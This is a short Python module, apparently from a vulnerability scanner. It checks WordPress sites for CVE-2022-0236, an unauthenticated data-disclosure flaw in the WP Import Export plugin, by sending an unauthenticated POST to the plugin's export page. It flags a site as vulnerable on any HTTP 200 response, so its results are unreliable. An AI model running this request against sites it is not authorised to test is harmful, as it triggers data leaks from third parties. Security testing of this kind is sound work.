# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2022-0236 - WordPress WP Import Export Plugin - Unauthenticated Sensitive Data Disclosure

import requests
from colorama import init, Fore, Style
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

data = {'wpie_download_export_id': '1'}

def check_vulnerability(profile_url):
    try:
        print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Checking {profile_url} for vulnerability...")

        response = requests.post(f'{profile_url}/wp-admin/admin.php?page=wpie-new-export', data=data, verify=False)

        if response.status_code == 200:
            print(f"{Style.BRIGHT}{Fore.GREEN}[+] {profile_url} is vulnerable to unauthenticated sensitive data disclosure.")
            return True
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[-] {profile_url} is not vulnerable.")
            return False

    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[-] An error occurred: {e}")
        return False

def scan_cve_2022_0236(profile_url):
    check_vulnerability(profile_url)
